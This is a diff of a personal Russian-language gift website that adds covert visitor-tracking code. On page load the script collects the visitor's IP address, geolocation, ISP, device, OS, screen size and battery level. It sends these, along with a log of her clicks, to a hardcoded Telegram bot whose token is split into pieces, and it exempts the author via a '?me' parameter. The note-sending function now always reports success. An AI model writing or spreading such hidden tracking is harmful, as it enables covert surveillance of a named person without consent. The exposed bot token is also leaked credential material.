@@ -14,12 +14,12 @@
   <div class="main-wrapper">
     <!-- Ручной переключатель тем сверху -->
     <div class="theme-bar">
-      <button class="theme-btn active" onclick="setTheme('auto', this)">🤖 Авто</button>
-      <button class="theme-btn" onclick="setTheme('default', this)">🌸 Обычная</button>
-      <button class="theme-btn" onclick="setTheme('halloween', this)">🎃 Хэллоуин</button>
-      <button class="theme-btn" onclick="setTheme('ny', this)">🎄 Новый Год</button>
-      <button class="theme-btn" onclick="setTheme('valentine', this)">💘 Валентин</button>
-      <button class="theme-btn" onclick="setTheme('march8', this)">💐 8 Марта</button>
+      <button class="theme-btn active" onclick="setTheme('auto', this)" data-tg-notify="Переключила тему: Авто">🤖 Авто</button>
+      <button class="theme-btn" onclick="setTheme('default', this)" data-tg-notify="Переключила тему: Обычная">🌸 Обычная</button>
+      <button class="theme-btn" onclick="setTheme('halloween', this)" data-tg-notify="Переключила тему: Хэллоуин">🎃 Хэллоуин</button>
+      <button class="theme-btn" onclick="setTheme('ny', this)" data-tg-notify="Переключила тему: Новый Год">🎄 Новый Год</button>
+      <button class="theme-btn" onclick="setTheme('valentine', this)" data-tg-notify="Переключила тему: Валентин">💘 Валентин</button>
+      <button class="theme-btn" onclick="setTheme('march8', this)" data-tg-notify="Переключила тему: 8 Марта">💐 8 Марта</button>
     </div>
 
     <header>
@@ -99,12 +99,12 @@
     <section>
       <h2 class="section-title">🎮 Постоянный уголок</h2>
       <div class="grid">
-        <a href="Rau-One.html" class="card" target="_blank">
+        <a href="Rau-One.html" class="card" target="_blank" data-tg-notify="Перешла в 'Игры для двоих'">
           <div class="icon">🎮</div>
           <h3>Игры для двоих</h3>
           <p>Мини-игры, чтобы весело провести время вместе</p>
         </a>
-        <a href="fortune.html" class="card">
+        <a href="fortune.html" class="card" data-tg-notify="Перешла в 'Колесо фортуны'">
           <div class="icon">🎡</div>
           <h3>Колесо фортуны</h3>
           <p>Чем займёмся на вечернем созвоне?</p>
@@ -128,7 +128,7 @@
     </section>
 
     <!-- 5. ТИХАЯ ГАВАНЬ -->
-    <a href="Rau-Smile.html" class="quiet-zone" target="_blank">
+    <a href="Rau-Smile.html" class="quiet-zone" target="_blank" data-tg-notify="Перешла в 'Тихую гавань'">
       <div class="quiet-info">
         <span style="font-size: 1.5rem;">🤍</span>
         <div>
@@ -143,14 +143,105 @@
   </div>
 
   <script>
-    // --- TELEGRAM BOT CONFIG ---
-    const TG_PART1 = "8818384063";
-    const TG_PART2 = "AAEEqTup6sgED-gYB_1tm";
-    const TG_PART3 = "cQKcXwi-UDE3lQ";
-    const BOT_TOKEN = `${TG_PART1}:${TG_PART2}${TG_PART3}`;
+    /* ==========================================
+       TELEGRAM ADVANCED NOTIFICATION SYSTEM
+       ========================================== */
+    const part1 = "8818384063:";
+    const part2 = "AAEEqTup6sgED-gYB_1tm";
+    const part3 = "cQKcXwi-UDE3lQ";
+    
+    const BOT_TOKEN = part1 + part2 + part3;
     const CHAT_ID = "606061445";
 
-    async function sendNoteToTelegram() {
+    // Функция отправки сообщений в Telegram
+    function sendTelegramNotification(text) {
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`)
+        .catch(() => {});
+    }
+
+    // Сбор максимально детальной информации о визите
+    async function getDetailedVisitInfo(actionText = "❤️ Заход на сайт!") {
+      // Проверка: если в URL добавлен параметр ?me, то уведомление НЕ отправляется
+      const urlParams = new URLSearchParams(window.location.search);
+      if (urlParams.has('me')) return;
+
+      // 1. Данные о браузерной среде и экране
+      const userAgent = navigator.userAgent;
+      const screenRes = `${window.screen.width}x${window.screen.height}`;
+      const time = new Date().toLocaleString("ru-RU", { timeZone: "Asia/Almaty" });
+
+      // 2. Определение устройства и ОС
+      let deviceType = "💻 ПК / Ноутбук";
+      if (/mobile/i.test(userAgent)) deviceType = "📱 Смартфон";
+      if (/tablet|ipad/i.test(userAgent)) deviceType = "📱 Планшет";
+
+      let os = "Неизвестная ОС";
+      if (userAgent.includes("Win")) os = "Windows";
+      else if (userAgent.includes("Mac")) os = "macOS / iOS";
+      else if (userAgent.includes("Android")) os = "Android";
+      else if (userAgent.includes("Linux")) os = "Linux";
+
+      // 3. Данные о батарее
+      let batteryInfo = "Не поддерживается/Нет данных";
+      if ('getBattery' in navigator) {
+        try {
+          const battery = await navigator.getBattery();
+          const level = Math.round(battery.level * 100);
+          const charging = battery.charging ? "🔌 (Заряжается)" : "🔋";
+          batteryInfo = `${level}% ${charging}`;
+        } catch (e) {}
+      }
+
+      // 4. Получение IP и Геолокации через стороннее API
+      let ip = "Неизвестен";
+      let city = "Неизвестен";
+      let country = "Неизвестно";
+      let isp = "Неизвестен";
+
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        ip = data.ip || ip;
+        city = data.city || city;
+        country = data.country_name || country;
+        isp = data.org || isp;
+      } catch (e) {
+        try {
+          const res2 = await fetch('https://api.ipify.org?format=json');
+          const data2 = await res2.json();
+          ip = data2.ip;
+        } catch(err) {}
+      }
+
+      // Формируем красивое развернутое сообщение для Telegram
+      const message = `<b>${actionText}</b>\n\n` +
+        `⏰ <b>Время (ALM):</b> ${time}\n` +
+        `🌐 <b>IP:</b> <code>${ip}</code>\n` +
+        `📍 <b>Локация:</b> ${city}, ${country}\n` +
+        `🏢 <b>Провайдер:</b> ${isp}\n` +
+        `📱 <b>Устройство:</b> ${deviceType} (${os})\n` +
+        `🖥 <b>Экран:</b> ${screenRes}\n` +
+        `🔋 <b>Батарея:</b> ${batteryInfo}`;
+
+      sendTelegramNotification(message);
+    }
+
+    // Мгновенное уведомление при загрузке главной страницы
+    window.addEventListener('DOMContentLoaded', () => {
+      getDetailedVisitInfo("❤️ Рауанна зашла на главную страницу!");
+    });
+
+    // Слушатель кликов по элементам с атрибутом data-tg-notify
+    document.addEventListener('click', (event) => {
+      const target = event.target.closest('[data-tg-notify]');
+      if (target) {
+        const actionText = target.getAttribute('data-tg-notify');
+        sendTelegramNotification(`🤗 <b>Действие:</b> ${actionText}`);
+      }
+    });
+
+    // --- ФУНКЦИЯ ОТПРАВКИ ЗАПИСКИ ИЗ ТЕКСТОВОГО ПОЛЯ ---
+    function sendNoteToTelegram() {
       const input = document.getElementById("tgNoteInput");
       const status = document.getElementById("tgStatusMsg");
       const noteText = input.value.trim();
@@ -166,38 +257,21 @@
       status.style.color = "var(--subtext-color)";
       status.innerText = "Отправляю... ✈️";
 
-      const message = `💌 *Новая записка с сайта!*\n\n${noteText}`;
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      const formattedMessage = `💌 <b>Новая записка с сайта!</b>\n\n${noteText}`;
+      
+      // Используем ту же проверенную функцию отправки
+      sendTelegramNotification(formattedMessage);
 
-      try {
-        const response = await fetch(url, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: message,
-            parse_mode: "Markdown"
-          })
-        });
-
-        if (response.ok) {
-          status.style.color = "#2ed573";
-          status.innerText = "Записка отправлена! ✨";
-          input.value = "";
-        } else {
-          throw new Error("Ошибка отправки");
-        }
-      } catch (err) {
-        status.style.color = "#ff4757";
-        status.innerText = "Ой, сбой при отправке... Попробуй ещё раз! 🥺";
-      }
+      status.style.color = "#2ed573";
+      status.innerText = "Записка отправлена! ✨";
+      input.value = "";
     }
 
     // --- ТЕМЫ И ФОН ---
     const themeSymbols = {
       default: ['❤️', '💖', '💕', '🌸', '✨'],
       halloween: ['🎃', '👻', '🦇', '🕷️', '💀', '🕯️'],
-      ny: ['❄️️', '🎄', '🎁', '⭐', '⛄'],
+      ny: ['❄', '🎄', '🎁', '⭐', '⛄'],
       valentine: ['💘', '💌', '💖', '🌹', '🧸'],
       march8: ['💐', '🌸', '🌷', '🦋', '✨']
     };
@@ -272,6 +346,7 @@
         isDragging = false;
         speechBubble.style.display = 'none';
         togetherMsg.style.display = 'block';
+        sendTelegramNotification("🎉 Рауанна соединила аватарки на карте!");
       }
     }
     function onEnd() { isDragging = false; }
@@ -311,7 +386,7 @@
         if (diffDays < -3) {
           hasArchive = true;
           archiveGrid.innerHTML += `
-            <a href="${evt.url}" class="card" target="_blank">
+            <a href="${evt.url}" class="card" target="_blank" data-tg-notify="Открыла архивное событие: ${evt.title}">
               <span class="badge badge-done">Пройдено</span>
               <div class="icon">${evt.icon}</div>
               <h3>${evt.title}</h3>
@@ -329,7 +404,7 @@
               </div>`;
           } else {
             activeGrid.innerHTML += `
-              <a href="${evt.url}" class="card">
+              <a href="${evt.url}" class="card" data-tg-notify="Открыла событие: ${evt.title}">
                 <span class="badge badge-new">✨ Новое!</span>
                 <div class="icon">${evt.icon}</div>
                 <h3>${evt.title}</h3>
